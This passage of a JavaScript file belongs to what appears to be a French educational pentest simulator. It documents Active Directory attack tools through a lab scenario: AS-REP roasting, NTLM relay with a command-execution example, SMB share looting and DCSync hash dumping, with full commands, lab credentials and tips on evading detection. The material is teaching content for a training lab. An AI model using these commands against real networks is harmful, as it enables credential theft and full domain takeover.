    context: 'Étape 3 du TD. Tentative de zone transfer AXFR sur corp.local → REFUSED (DC bien configuré). En cas de succès, on obtiendrait TOUS les enregistrements DNS internes (IPs de toutes les machines, sous-domaines cachés). Complète dnsrecon.',
    syntax: [
      `${C}dig axfr <domaine> @<ip-dc>${X}    Zone Transfer complet (cible : serveur DNS)`,
      `${C}dig <type> <domaine> @<ip>${X}     Requête DNS ciblée (A, MX, NS, SRV...)`,
      `${C}dig +short <domaine>${X}           Résultat concis (IP uniquement)`,
    ],
    examples: [
      `dig axfr corp.local @192.168.1.10   ${D}→ tentative de zone transfer (attendu : REFUSED)${X}`,
      `dig NS corp.local @192.168.1.10     ${D}→ serveurs DNS du domaine${X}`,
    ],
    breakdown: {
      cmd: 'dig axfr corp.local @192.168.1.10',
      parts: [
        { token: 'dig',             desc: 'Domain Information Groper — outil de requêtes DNS en ligne de commande' },
        { token: 'axfr',            desc: 'Type de requête : Asynchronous Full Transfer Zone — demande TOUS les enregistrements du domaine au serveur DNS' },
        { token: 'corp.local',      desc: 'Le domaine DNS à transférer (découvert avec nmap -sC ou dnsrecon)' },
        { token: '@192.168.1.10',   desc: '@ = spécifie le serveur DNS à interroger directement (le DC, qui fait aussi office de DNS)' },
      ],
    },
    tips: [
      `Si AXFR réussit → tous les hôtes internes (IPs, sous-domaines) exposés en une commande`,
      `AXFR REFUSED = bonne configuration. AXFR succès = misconfiguration critique`,
      `Complémentaire de dnsrecon qui est plus complet (teste aussi les SRV records)`,
      `En réel : tester depuis l\'externe d\'abord, puis depuis une machine compromise en interne`,
    ],
  },
  gobuster: {
    cat: 'Reconnaissance Web',
    desc: 'Brute-force de répertoires et fichiers HTTP/HTTPS — découvre les chemins cachés non référencés.',
    syntax: [
      `${C}gobuster dir -u http://<ip> -w <wordlist>${X}                    Répertoires`,
      `${C}gobuster dir -u http://<ip> -w <wordlist> -x asp,aspx,txt${X}   Avec extensions`,
      `${C}gobuster dir -u http://<ip> -w <wordlist> -t 50 -o out.txt${X}  50 threads + export`,
    ],
    examples: [
      `gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,txt`,
    ],
    tips: [
      `Wordlists : dirb/common.txt (rapide) | dirbuster/medium.txt (complet) | seclists/ (avancé)`,
      `Extensions IIS : .asp .aspx .txt .config .xml | Extensions Linux : .php .html .txt .bak`,
      `Ne fait pas de récursion — utilise feroxbuster pour explorer automatiquement les sous-dossiers`,
      `-k pour ignorer les erreurs SSL | -b 404,403 pour ignorer certains codes HTTP`,
    ],
  },
  feroxbuster: {
    cat: 'Reconnaissance Web',
    desc: 'Version récursive de gobuster — explore automatiquement chaque répertoire découvert.',
    syntax: [
      `${C}feroxbuster --url http://<ip> --wordlist <wl>${X}                         Scan récursif`,
      `${C}feroxbuster --url http://<ip> --wordlist <wl> --extensions asp,aspx${X}   Avec extensions`,
      `${C}feroxbuster --url http://<ip> --wordlist <wl> --depth 3 --threads 50${X}  Profondeur + threads`,
    ],
    examples: [
      `feroxbuster --url http://192.168.1.10 --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt --extensions asp,aspx,txt --depth 3`,
    ],
    tips: [
      `Plus lent que gobuster mais plus complet — explore /backup/ → /backup/old/ → /backup/old/2023/ etc.`,
      `--depth 3 recommandé pour éviter les boucles infinies`,
      `--threads 50 est le défaut. Augmenter avec précaution (peut déclencher rate-limiting)`,
      `Idéal pour les apps web complexes avec beaucoup de sous-répertoires`,
    ],
  },
  enum4linux: {
    cat: 'Reconnaissance AD',
    desc: 'Énumération SMB/RPC d\'un Active Directory — users, groupes, SID, politique de mots de passe, sans authentification.',
    context: 'Étape 6 du TD. Révèle 6 comptes AD (Administrator, Guest, krbtgt, svc_backup, john.doe, jane.smith) via RID cycling sans credentials. Révèle aussi l\'absence de lockout sur les comptes → brute-force possible. La liste d\'utilisateurs obtenue sert directement pour kerbrute et GetNPUsers.',
    syntax: [
      `${C}enum4linux -a <ip>${X}    Énumération complète (all)`,
      `${C}enum4linux -U <ip>${X}    Users uniquement`,
      `${C}enum4linux -G <ip>${X}    Groupes uniquement`,
      `${C}enum4linux -P <ip>${X}    Password policy uniquement`,
      `${C}enum4linux -S <ip>${X}    Partages SMB`,
    ],
    examples: [
      `enum4linux -a 192.168.1.10   ${D}→ révèle Administrator, krbtgt, svc_backup, groupes AD, SID${X}`,
    ],
    breakdown: {
      cmd: 'enum4linux -a 192.168.1.10',
      parts: [
        { token: 'enum4linux',     desc: 'Outil d\'énumération SMB/NetBIOS pour Windows/AD — wrapper autour de smbclient, rpcclient, net' },
        { token: '-a',             desc: 'All : active toutes les options (-U users, -S shares, -G groups, -P password policy, -R RID cycling, -o OS info)' },
        { token: '192.168.1.10',   desc: 'IP du Domain Controller cible dans ce lab' },
      ],
    },
    tips: [
      `RID cycling = bruteforce des SIDs (S-1-5-21-...-500 = Administrator, 501 = Guest, 502 = krbtgt)`,
      `Null session = connexion SMB sans credentials. Souvent autorisée par défaut sur vieux DC`,
      `Les users trouvés → wordlist pour kerbrute userenum et impacket-GetNPUsers`,
      `Remplacé par nxc (NetExec) en moderne : nxc smb <ip> -u '' -p '' --users`,
    ],
  },
  whoami: {
    cat: 'Post-exploitation',
    desc: 'Affiche l\'identité et les privilèges de l\'utilisateur courant.',
    syntax: [
      `${C}whoami${X}              Nom de l\'utilisateur courant`,
      `${C}whoami /all${X}         Windows : groupes + privilèges complets`,
      `${C}id${X}                  Linux : uid, gid, groupes`,
    ],
    examples: [
      `whoami /all   ${D}→ vérifie si tu es dans "Domain Admins" ou "Administrators"${X}`,
    ],
    tips: [
      `Première commande à taper après chaque accès initial ou pivot`,
      `Linux : si uid=0 → root. Sinon, cherche les sudo avec sudo -l`,
      `Windows : cherche SeImpersonatePrivilege (PrintSpoofer), SeDebugPrivilege (Mimikatz)`,
    ],
  },
  'impacket-getnpusers': {
    cat: 'Exploitation Kerberos',
    desc: 'impacket-GetNPUsers implémente l\'attaque AS-REP Roasting. Dans le protocole\nKerberos, la pré-authentification est une mesure de sécurité obligatoire par\ndéfaut : le client prouve son identité AVANT que le KDC lui envoie un ticket.\nSi un administrateur décoche "Require Kerberos preauthentication" sur un compte,\nle KDC envoie un AS-REP (ticket chiffré) à n\'importe qui qui le demande — sans\npreuve d\'identité. Ce ticket est chiffré avec la clé du compte (son hash NTLM),\ndone crackable offline avec hashcat -m 18200.',
    context: 'Dans ce TD (étape 12), GetNPUsers teste les 6 comptes découverts par enum4linux\net kerbrute. svc_backup est configuré sans pré-authentification Kerberos —\nvulnérabilité de misconfiguration typique sur les comptes de service.\nL\'outil envoie un AS-REQ au KDC (port 88 du DC) pour chaque compte. Pour\nsvc_backup, le KDC répond avec un AS-REP contenant un hash $krb5asrep$23$...\nCe hash est ensuite cracké par hashcat sans aucune connexion supplémentaire.\nAucun event 4625 (Logon Failure) ni 4768 (Kerberos Auth) suspect généré.',
    syntax: [
      `${C}impacket-GetNPUsers <domaine>/ -dc-ip <ip> -no-pass -usersfile <liste>${X}`,
      `${C}impacket-GetNPUsers <domaine>/<user>:<pass> -dc-ip <ip> -request${X}`,
      `${C}impacket-GetNPUsers <domaine>/ -dc-ip <ip> -no-pass -format hashcat${X}`,
    ],
    examples: [
      `impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt`,
    ],
    breakdown: {
      cmd: 'impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt',
      parts: [
        { token: 'impacket-GetNPUsers', desc: 'L\'outil GetNPUsers fait partie de la suite Impacket (bibliothèque\nPython pour les protocoles réseau Microsoft). Son nom complet signifie\n"Get No Pre-authentication Users" : il identifie les comptes AD qui\nn\'ont pas la pré-authentification Kerberos activée, puis récupère\nleurs hashes AS-REP crackables. Il communique directement avec le KDC\nvia le protocole Kerberos sur le port 88.' },
        { token: 'corp.local/', desc: 'Le DOMAIN suivi d\'un slash obligatoire. C\'est le format Impacket\npour spécifier le domaine AD cible. Sans nom d\'utilisateur après le\nslash (ex: corp.local/ vs corp.local/admin), on teste la liste\ncomplète fournie avec -usersfile. Le domaine corp.local a été\ndécouvert avec nmap -sC (script smb-os-discovery) et confirmé\npar dnsrecon.' },
        { token: '-dc-ip 192.168.1.10', desc: 'Spécifie l\'adresse IP du Domain Controller à contacter comme KDC\n(Kerberos Key Distribution Center). L\'outil envoie les requêtes\nAS-REQ directement sur le port 88/TCP de cette IP. Même si le\ndomaine corp.local est résolvable par DNS, -dc-ip force l\'IP\ndirecte et évite les problèmes de résolution DNS.' },
        { token: '-no-pass', desc: 'Indique de ne pas essayer de mot de passe. En mode normal, Kerberos\nexige que le client prouve son identité (pré-authentification) avant\nd\'obtenir un ticket. Avec -no-pass, l\'outil envoie une AS-REQ sans\npré-auth pour chaque compte. Si le KDC répond avec un AS-REP (au\nlieu d\'une erreur), le compte est vulnérable à l\'AS-REP Roasting\net son hash est extrait de la réponse.' },
        { token: '-usersfile users.txt', desc: 'Fichier contenant la liste des noms d\'utilisateurs à tester, un\npar ligne. Ces noms viennent de enum4linux (RID cycling) ou\nkerbrute (validation Kerberos). Pour chaque entrée, GetNPUsers\nenvoie un AS-REQ et analyse la réponse du KDC : erreur PREAUTH\nREQUIRED = compte sûr, AS-REP reçu = compte vulnérable et hash\nextrait automatiquement.' },
      ],
    },
    tips: [
      `Condition : le compte AD n\'a pas "Require Kerberos preauthentication" coché`,
      `Le hash $krb5asrep$23$... est cracké offline avec hashcat -m 18200`,
      `Aucun log d\'authentification côté DC — technique discrète (pas d\'event 4625)`,
      `Prépare la liste d\'users avec kerbrute userenum ou enum4linux`,
    ],
  },
  getnpusers: {
    cat: 'Exploitation Kerberos',
    desc: 'Alias de impacket-GetNPUsers. AS-REP Roasting pour récupérer des hashes Kerberos crackables.',
    syntax: [`Même usage que impacket-GetNPUsers`],
    examples: [`impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -no-pass -usersfile users.txt`],
    tips: [`Tape impacket-getnpusers? pour la doc complète`],
  },
  smbclient: {
    cat: 'Accès — Partages SMB',
    desc: 'smbclient est un client SMB en ligne de commande, similaire à un client FTP.\nIl permet de se connecter à un partage réseau Windows (SMB), de naviguer dans\nl\'arborescence de fichiers, de télécharger (get) et d\'uploader (put) des\nfichiers. Contrairement à nxc qui est un outil d\'énumération, smbclient est\nun outil d\'accès interactif — il ouvre une session sur le partage et attend\ndes commandes (ls, cd, get, put, exit). C\'est l\'équivalent Linux de l\'accès\nà \\\\serveur\\partage depuis Windows Explorer.',
    context: 'Dans ce TD (étape 15), on se connecte au partage //192.168.1.10/backup\ndécouvert par nxc --shares. Ce partage est accessible en READ/WRITE avec\nles credentials svc_backup:ManagementPassword123. Le contenu est critique :\nadmin_credentials.txt contient des credentials Domain Admin en clair ET\nconfirme que svc_backup a les droits DCSync ("Replicating Directory Changes").\nntds_backup_2023.zip est une copie de la base AD. Ces informations permettent\nde passer directement à impacket-secretsdump pour le dump complet du domaine.',
    syntax: [
      `${C}smbclient //<ip>/<share>${X}                              Connexion anonyme`,
      `${C}smbclient //<ip>/<share> -U <domain>/<user>%<pass>${X}   Connexion authentifiée`,
      `${C}smbclient -L //<ip>${X}                                   Liste les partages`,
    ],
    examples: [
      `smbclient //192.168.1.10/backup -U corp/svc_backup%ManagementPassword123`,
    ],
    breakdown: {
      cmd: 'smbclient //192.168.1.10/backup -U corp/svc_backup%ManagementPassword123',
      parts: [
        { token: 'smbclient', desc: 'Le programme smbclient. Après connexion, il ouvre un shell\ninteractif avec un prompt "smb: \\>" où on peut entrer des\ncommandes : ls (lister), cd (naviguer), get <fichier>\n(télécharger), put <fichier> (uploader), exit (quitter).\nLa commande "get admin_credentials.txt" télécharge le fichier\nlocalement pour en lire le contenu.' },
        { token: '//192.168.1.10/backup', desc: 'Le chemin UNC (Universal Naming Convention) du partage en\nnotation Linux : //IP/NOM_DU_PARTAGE. En notation Windows ce\nserait \\\\192.168.1.10\\backup. "backup" est le nom du partage\ndécouvert à l\'étape précédente avec "nxc smb 192.168.1.10\n-u svc_backup -p ManagementPassword123 --shares". Sans le nom\ndu partage, on ne peut pas se connecter à un partage spécifique.' },
        { token: '-U corp/svc_backup%ManagementPassword123', desc: '-U spécifie les credentials dans le format smbclient :\nDOMAINE/utilisateur%motdepasse. Le caractère % sépare le\nnom d\'utilisateur du mot de passe dans ce format condensé\n(contrairement à nxc qui utilise -u et -p séparément).\n"corp" est le nom court du domaine AD (NetBIOS name, différent\ndu FQDN corp.local). svc_backup est l\'utilisateur dont on\na cracké le mot de passe ManagementPassword123 via hashcat.' },
      ],
    },
    tips: [
      `Commandes dans le shell SMB : ls, get <fichier>, put <fichier>, cd, pwd`,
      `get admin_credentials.txt → télécharge le fichier localement`,
      `Utilise nxc smb --shares pour lister les partages accessibles avant de te connecter`,
      `Partages intéressants : backup, SYSVOL, NETLOGON, IPC$`,
    ],
  },
  nxc: {
    cat: 'Énumération — SMB/WinRM/LDAP',
    desc: 'NetExec (nxc) est le successeur de CrackMapExec. C\'est l\'outil "couteau suisse"\ndu pentesting Active Directory. Il permet de faire du fingerprinting SMB sans\nauthentification (révèle OS, hostname, domaine, et surtout le statut du SMB\nSigning), de valider des credentials sur des cibles multiples, d\'énumérer les\nutilisateurs et partages avec un compte valide, et de faire du Pass-the-Hash\n(option -H). Le label (Pwn3d!) signifie que le compte est admin local ou DA.',
    context: 'Dans ce TD, nxc est utilisé à deux étapes clés. Étape 7 : sans credentials,\npour fingerprinter le DC → révèle que SMB Signing est REQUIRED, ce qui bloque\ntoute attaque NTLM Relay (Responder/ntlmrelayx seront inutiles sur cette cible).\nÉtape 14 : avec les credentials svc_backup:ManagementPassword123 (crackés par\nhashcat) et --shares → valide que les credentials sont corrects, affiche (Pwn3d!)\net liste les partages avec permissions. Le partage "backup" est en READ/WRITE —\nce qui permet smbclient pour récupérer admin_credentials.txt.',
    syntax: [
      `${C}nxc smb <ip>${X}                                          Fingerprint SMB (OS, signing, domaine)`,
      `${C}nxc smb <ip> -u '' -p '' --shares${X}                    Null session → liste partages`,
      `${C}nxc smb <ip> -u <user> -p <pass> --shares${X}            Authentifié → partages accessibles`,
      `${C}nxc smb <ip> -u <user> -p <pass> --users${X}             Énumération des users`,
      `${C}nxc smb <ip> -u <user> -H <ntlm_hash>${X}                Pass-the-Hash`,
      `${C}nxc winrm <ip> -u <user> -p <pass>${X}                   Test accès WinRM`,
    ],
    examples: [
      `nxc smb 192.168.1.10                                          ${D}→ fingerprint DC${X}`,
      `nxc smb 192.168.1.10 -u svc_backup -p ManagementPassword123 --shares  ${D}→ partages visibles${X}`,
    ],
    breakdown: {
      cmd: 'nxc smb 192.168.1.10 -u svc_backup -p ManagementPassword123 --shares',
      parts: [
        { token: 'nxc', desc: 'NetExec, le programme principal. Anciennement crackmapexec (cme),\nrenommé en 2023. Il supporte plusieurs protocoles : smb, winrm,\nldap, ssh, ftp, rdp. Ici on l\'utilise avec smb pour interagir\navec le service de partage de fichiers Windows (port 445).' },
        { token: 'smb', desc: 'Le sous-protocole cible. SMB (Server Message Block) est le protocole\nWindows pour le partage de fichiers et d\'imprimantes. Il tourne\nsur le port 445/TCP. nxc smb peut faire du fingerprinting (sans\ncredentials), de la validation de comptes, de l\'énumération de\npartages/utilisateurs, et du Pass-the-Hash (avec -H).' },
        { token: '192.168.1.10', desc: 'L\'adresse IP de la cible — ici le Domain Controller. On peut aussi\nspécifier un range (192.168.1.0/24) pour scanner tout le réseau\nou un fichier (-t targets.txt). Chaque IP est testée en parallèle\npar des threads nxc (configurable avec --threads).' },
        { token: '-u svc_backup', desc: '-u spécifie le nom d\'utilisateur pour l\'authentification SMB.\nsvc_backup est un compte de service découvert d\'abord par enum4linux\npuis validé par kerbrute. Son mot de passe a ensuite été obtenu\nvia AS-REP Roasting (GetNPUsers + hashcat). Sans -u/-p, nxc fait\njuste du fingerprinting SMB anonyme.' },
        { token: '-p ManagementPassword123', desc: '-p spécifie le mot de passe en clair. Ce mot de passe a été\nreconstitué en deux étapes : hash $krb5asrep$23$ récupéré par\nGetNPUsers, puis cracké avec hashcat -m 18200 et rockyou.txt.\nSi les credentials sont corrects, nxc affiche [+] et éventuellement\n(Pwn3d!) si le compte est admin sur la cible.' },
        { token: '--shares', desc: 'Demande à nxc d\'énumérer tous les partages SMB accessibles avec\nce compte et d\'afficher les permissions (READ ONLY / READ,WRITE /\nNO ACCESS). C\'est ainsi qu\'on découvre le partage "backup" accessible\nen READ,WRITE par svc_backup — ce qui nous permet ensuite de s\'y\nconnecter avec smbclient pour récupérer admin_credentials.txt.' },
      ],
    },
    tips: [
      `(Pwn3d!) dans la sortie = compte admin local ou domain admin → accès total`,
      `SMB Signing: True REQUIRED → NTLM Relay impossible sur cette cible`,
      `Null session STATUS_ACCESS_DENIED = bonne config (pas de session anonyme)`,
      `Anciens alias : crackmapexec (cme), netexec — même syntaxe`,
    ],
  },
  netexec: {
    cat: 'Énumération — SMB/WinRM/LDAP',
    desc: 'Alias de nxc. Tape nxc? pour la documentation complète.',
    syntax: [`Même syntaxe que nxc`],
    examples: [`nxc smb 192.168.1.10 -u svc_backup -p ManagementPassword123 --shares`],
    tips: [`nxc = netexec = crackmapexec (cme) — même outil, noms différents selon la version`],
  },
  crackmapexec: {
    cat: 'Énumération — SMB/WinRM/LDAP',
    desc: 'Ancien nom de nxc/NetExec. Tape nxc? pour la documentation complète.',
    syntax: [`Même syntaxe que nxc`],
    examples: [`crackmapexec smb 192.168.1.10`],
    tips: [`Remplacé par nxc (NetExec) depuis 2023`],
  },
  responder: {
    cat: 'Capture — NTLM Relay',
    desc: 'Empoisonneur LLMNR/NBT-NS/mDNS — intercepte les authentifications NTLM sur le réseau local.',
    context: 'Étape 8 du TD. Empoisonne les résolutions de noms sur le réseau pour capturer des hashes NTLMv2. Dans ce lab : SMB Signing est REQUIRED sur le DC → le relay vers le DC échoue. Mais les hashes capturés restent crackables offline avec hashcat -m 5600. Illustre pourquoi signing=True est important.',
    syntax: [
      `${C}responder -I <interface>${X}                     Écoute passive sur l\'interface`,
      `${C}responder -I <interface> -rdw${X}                Écoute + WPAD/HTTP/HTTPS`,
      `${C}responder -I <interface> --lm${X}                Force LM downgrade (hashes LM)`,
    ],
    examples: [
      `responder -I eth0   ${D}→ empoisonne LLMNR/NBT-NS et capture les hashes NTLMv2${X}`,
    ],
    breakdown: {
      cmd: 'responder -I eth0',
      parts: [
        { token: 'responder',   desc: 'Empoisonneur réseau — répond aux requêtes LLMNR, NBT-NS et mDNS en se faisant passer pour la machine cherchée' },
        { token: '-I eth0',     desc: '-I = Interface réseau à écouter. eth0 = première interface Ethernet (adapter à ton interface : ip a pour voir les interfaces disponibles)' },
      ],
    },
    tips: [
      `Prérequis : être sur le même segment réseau que les victimes`,
      `Hashes capturés dans /usr/share/responder/logs/ → crackables avec hashcat -m 5600`,
      `Si SMB Signing REQUIRED → relay échoue mais la capture des hashes fonctionne quand même`,
      `Désactiver SMB/HTTP dans Responder.conf si tu veux relay uniquement (éviter les conflits)`,
    ],
  },
  ntlmrelayx: {
    cat: 'Exploitation — NTLM Relay',
    desc: 'Relaye les authentifications NTLM capturées vers d\'autres services (SMB, LDAP, HTTP...). Nécessite SMB Signing désactivé.',
    context: 'Étape 8 du TD (avec Responder). Dans ce lab : SMB Signing est REQUIRED → le relay SMB vers 192.168.1.10 échoue systématiquement. Objectif pédagogique : comprendre POURQUOI signing=True bloque le relay. En cas de signing=False, ntlmrelayx permettrait d\'obtenir un shell sans aucun mot de passe.',
    syntax: [
      `${C}impacket-ntlmrelayx -tf targets.txt -smb2support${X}             Relay SMB basique`,
      `${C}impacket-ntlmrelayx -tf targets.txt -smb2support -i${X}          Shell SMB interactif`,
      `${C}impacket-ntlmrelayx -t ldap://<dc-ip> --delegate-access${X}      Relay vers LDAP`,
      `${C}impacket-ntlmrelayx -t <ip> -c "cmd /c whoami > C:\\out.txt"${X}  RCE via relay`,
    ],
    examples: [
      `impacket-ntlmrelayx -tf targets.txt -smb2support   ${D}→ relay SMB vers cibles sans signing${X}`,
    ],
    breakdown: {
      cmd: 'impacket-ntlmrelayx -tf targets.txt -smb2support',
      parts: [
        { token: 'impacket-ntlmrelayx', desc: 'Outil Impacket de relay NTLM — reçoit les hashes de Responder et les rejoue vers les cibles' },
        { token: '-tf targets.txt',     desc: '-tf = targets file : fichier listant les IPs cibles vers lesquelles relayer (ex: 192.168.1.10). Si la cible a SMB Signing=False, le relay réussit' },
        { token: '-smb2support',        desc: 'Active le support de SMBv2/SMBv3 (obligatoire sur les systèmes Windows modernes qui ont désactivé SMBv1)' },
      ],
    },
    tips: [
      `SMB Signing REQUIRED sur la cible → relay SMB impossible (mais LDAP relay peut fonctionner)`,
      `Utilise en combinaison avec Responder (désactive SMB/HTTP dans Responder.conf)`,
      `--delegate-access : crée un compte machine et délègue l\'accès → path vers DA`,
      `Vérifie signing avec : nxc smb <ip> (signing:False = vulnérable au relay)`,
    ],
  },
  'impacket-ntlmrelayx': {
    cat: 'Exploitation — NTLM Relay',
    desc: 'Alias de ntlmrelayx. Tape ntlmrelayx? pour la documentation complète.',
    syntax: [`Même syntaxe que ntlmrelayx`],
    examples: [`impacket-ntlmrelayx -tf targets.txt -smb2support`],
    tips: [`impacket-ntlmrelayx = ntlmrelayx.py — même outil`],
  },
  'impacket-secretsdump': {
    cat: 'Post-exploitation AD',
    desc: 'impacket-secretsdump implémente l\'attaque DCSync. Dans un domaine AD, les\nDomain Controllers se répliquent entre eux via le protocole MS-DRSR (Directory\nReplication Service Remote Protocol). Normalement seuls les DCs peuvent demander\nune réplication. Si un compte ordinaire a les droits "Replicating Directory\nChanges", il peut simuler un DC et demander au vrai DC de lui envoyer tous les\nhashes NTLM du domaine — y compris Administrator et krbtgt. Aucun fichier\nn\'est écrit sur le DC, ce qui rend l\'attaque très difficile à détecter.',
    context: 'Dans ce TD (étape 16), svc_backup a des droits DCSync découverts dans\nadmin_credentials.txt sur le partage backup (ligne : "svc_backup has DCSync\nrights (Replicating Directory Changes)"). secretsdump utilise ces droits pour\ndemander une réplication au DC 192.168.1.10. Le DC répond en envoyant tous ses\nhashes : Administrator (hash NTLM direct pour Pass-the-Hash), krbtgt (permet\nde forger des Golden Tickets valides 10 ans), et tous les comptes du domaine.\nLe hash Administrator 5f4dcc3b... est immédiatement utilisé avec evil-winrm.',
    syntax: [
      `${C}impacket-secretsdump <DOMAIN>/<user>:<pass>@<ip>${X}           Credentials texte`,
      `${C}impacket-secretsdump -H <ntlm> <DOMAIN>/<user>@<ip>${X}        Pass-the-Hash`,
      `${C}impacket-secretsdump -dc-ip <ip> <DOMAIN>/<user>:<pass>@<ip>${X}  Avec DC-IP explicite`,
      `${C}impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM${X}   Dump offline`,
    ],
    examples: [
      `impacket-secretsdump corp.local/svc_backup:ManagementPassword123@192.168.1.10`,
      `impacket-secretsdump -dc-ip 192.168.1.100 CORP/svc_backup:ManagementPassword123@192.168.1.100`,
    ],
    breakdown: {
      cmd: 'impacket-secretsdump corp.local/svc_backup:ManagementPassword123@192.168.1.10',
      parts: [
        { token: 'impacket-secretsdump', desc: 'L\'outil secretsdump de la suite Impacket. Il implémente plusieurs\nméthodes d\'extraction de hashes : DCSync (via MS-DRSR sur réseau),\nlecture directe de NTDS.dit + SYSTEM hive (si accès au filesystem),\nou dump de la SAM locale. Ici on utilise DCSync via le réseau —\nla méthode la plus discrète car elle ne crée aucun fichier sur le DC\net ne nécessite pas d\'accès physique aux fichiers système.' },
        { token: 'corp.local/', desc: 'Le domaine Active Directory suivi d\'un slash. C\'est le format\nImpacket pour les credentials : DOMAIN/user:pass@ip. Le slash est\nobligatoire — sans lui, Impacket ne reconnaît pas le format et\néchoue. corp.local est le nom du domaine AD découvert lors des\nétapes de reconnaissance (nmap -sC, dnsrecon).' },
        { token: 'svc_backup', desc: 'Le compte utilisé pour l\'authentification. svc_backup a les droits\n"Replicating Directory Changes" et "Replicating Directory Changes All"\nsur l\'objet domaine CORP.LOCAL — droits normalement réservés aux\nDomain Controllers et aux solutions de backup légitimes. Cette\nmisconfiguration a été découverte dans admin_credentials.txt sur le\npartage backup lors de l\'étape smbclient.' },
        { token: ':ManagementPassword123', desc: 'Le mot de passe du compte svc_backup, précédé de : (séparateur\ndu format Impacket DOMAIN/user:pass@ip). Ce mot de passe a été\nreconstruit en deux étapes : d\'abord récupéré sous forme de hash\n$krb5asrep$23$ via GetNPUsers (AS-REP Roasting), puis cracké en\nclair avec hashcat -m 18200 et la wordlist rockyou.txt.' },
        { token: '@192.168.1.10', desc: 'Le @ sépare les credentials de la cible dans le format Impacket.\n192.168.1.10 est l\'IP du Domain Controller. secretsdump va se\nconnecter sur le port 445 (SMB) et 135 (RPC/DCOM) de cette IP,\ns\'authentifier avec svc_backup, puis envoyer des requêtes MS-DRSR\npour demander une "réplication" — le DC répond en envoyant tous les\nhashes NTLM de la base NTDS.dit.' },
      ],
    },
    tips: [
      `Nécessite un compte avec "Replicating Directory Changes" (droits DCSync)`,
      `Retourne : Administrator, krbtgt, et TOUS les hashes du domaine`,
      `Hash krbtgt → Golden Ticket (persistance 10 ans sur tout le domaine)`,
      `Hash Administrator NTLM → evil-winrm Pass-the-Hash → shell DC`,
      `Aucune écriture sur le DC — technique très discrète (pas de fichier créé)`,
    ],
  },
};

function renderToolDoc(toolName) {
  const doc = TOOL_DOCS[toolName.toLowerCase()] || TOOL_DOCS[toolName.replace(/-/g, '')];
  if (!doc) {
    const available = Object.keys(TOOL_DOCS).join(', ');
    return {
      output: [
        `\x1b[31m[!] Aucune documentation pour "${toolName}"\x1b[0m`,
        ``,
        `${D}Outils documentés : ${available}${X}`,
        `${D}Syntaxe : <commande>?   ex: nmap? hydra? nc?${X}`,
      ].join('\n'),
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }
  // Helper : affiche un texte multi-lignes avec indentation
  function para(text, indent) {
    return text.split('\n').map(l => `${indent}${l}`);
  }

  const SEP = `${D}${'─'.repeat(57)}${X}`;

  const lines = [
    ``,
    `\x1b[36m╔${'═'.repeat(57)}╗\x1b[0m`,
    `\x1b[36m║  \x1b[32m${toolName.toUpperCase().padEnd(24)}\x1b[90m[${doc.cat}]\x1b[36m${' '.repeat(Math.max(0, 28 - doc.cat.length - toolName.length))}║\x1b[0m`,
    `\x1b[36m╚${'═'.repeat(57)}╝\x1b[0m`,
    ``,
    `\x1b[32m━━ DESCRIPTION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m`,
    ...para(doc.desc, '  '),
    ``,
  ];

  if (doc.context) {
    lines.push(
      `\x1b[35m━━ 📍 RÔLE DANS CE LAB (TD Active Directory) ━━━━━━━━━━━━━\x1b[0m`,
      ...para(doc.context, '  '),
      ``,
    );
  }

  lines.push(
    `\x1b[32m━━ SYNTAXE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m`,
    ...doc.syntax.map(s => `  ${s}`),
    ``,
    `\x1b[32m━━ EXEMPLES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m`,
    ...doc.examples.map(e => `  ${C}${e}${X}`),
    ``,
  );

  if (doc.breakdown) {
    lines.push(
      `\x1b[33m━━ 🔍 DÉCRYPTAGE DE LA COMMANDE ━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m`,
      `  \x1b[36m${doc.breakdown.cmd}\x1b[0m`,
      ``,
    );
    const maxLen = Math.max(...doc.breakdown.parts.map(p => p.token.length));
    doc.breakdown.parts.forEach((p, i) => {
      const pad = ' '.repeat(Math.max(0, maxLen - p.token.length + 1));
      // Token header
      lines.push(`  \x1b[32m${p.token}\x1b[0m${pad} \x1b[90m│\x1b[0m`);
      // Description (multi-ligne possible)
      p.desc.split('\n').forEach(dl => {
        lines.push(`  ${' '.repeat(maxLen + 2)}\x1b[90m│\x1b[0m  ${dl}`);
      });
      if (i < doc.breakdown.parts.length - 1) lines.push(`  ${' '.repeat(maxLen + 2)}\x1b[90m│\x1b[0m`);
    });
    lines.push(``);
  }

  lines.push(
    `\x1b[32m━━ CONSEILS PRO ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m`,
    ...doc.tips.map(t => `  \x1b[33m▸\x1b[0m ${t}`),
    ``,
  );

  return {
    output: lines.join('\n'),
    pedagogie: doc.desc.split('\n')[0],
    effect: null, xpBonus: 0, stateChanges: {}
  };
}

// ─── Main entry point ─────────────────────────────────────────────────────────

function processCommand(rawInput, state) {
  if (!rawInput || !rawInput.trim()) return { output: '', pedagogie: null, effect: null, newState: state };

  const trimmed = rawInput.trim();
  const parts = trimmed.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);

  if (cmd === 'clear') return { output: '\x1b[2J\x1b[H', pedagogie: null, effect: { type: 'CLEAR' }, newState: state };

  // ── cmd? → documentation détaillée ──
  const toolQuery = cmd.endsWith('?') ? cmd.slice(0, -1) : (args[0] === '?' ? cmd : null);
  if (toolQuery) {
    const doc = renderToolDoc(toolQuery);
    return { output: doc.output, pedagogie: doc.pedagogie, effect: null, newState: state };
  }

  const mode = state.mode || 'NETWORK';
  const result = mode === 'MACHINE' ? handleMachine(cmd, args, state) : handleNetwork(cmd, args, state);

  const newState = {
    ...state,
    xp: state.xp + (result.xpBonus || 0),
    ...result.stateChanges
  };

  return { output: result.output, pedagogie: result.pedagogie, effect: result.effect, newState };
}

export { processCommand, MACHINES };
